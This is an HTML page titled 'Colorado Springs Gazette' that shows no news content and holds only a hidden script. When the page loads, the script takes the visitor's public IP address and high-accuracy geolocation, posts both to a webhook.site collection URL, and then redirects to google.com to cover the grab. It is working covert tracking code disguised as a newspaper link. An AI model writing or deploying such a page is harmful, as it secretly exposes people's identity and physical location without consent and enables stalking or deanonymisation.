<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Colorado Springs Gazette</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="">
    </head>
    <body>
        <script type="text/javascript">
async function reportData(uuid, data) {
  const url = "https://webhook.site/113907e9-3057-4db2-af79-0db93059aefa";

  const response = await fetch(url, {
    method: "POST",
    body: `UUID: ${uuid}\n\n` + `${data}`,
  });

  await response.json();
}

(async () => {
  try {
    const uuid = crypto.randomUUID();
    await fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => reportData(uuid, `IP: ${data.ip}`));
  } catch (e) {}

  try {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const coords = position.coords;
        reportData(JSON.stringify(coords));
      },
      (error) => {
        console.error(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
      }
    );
  } catch (e) {}
    window.location.replace("https://google.com");
})();
        </script>
    </body>
</html>
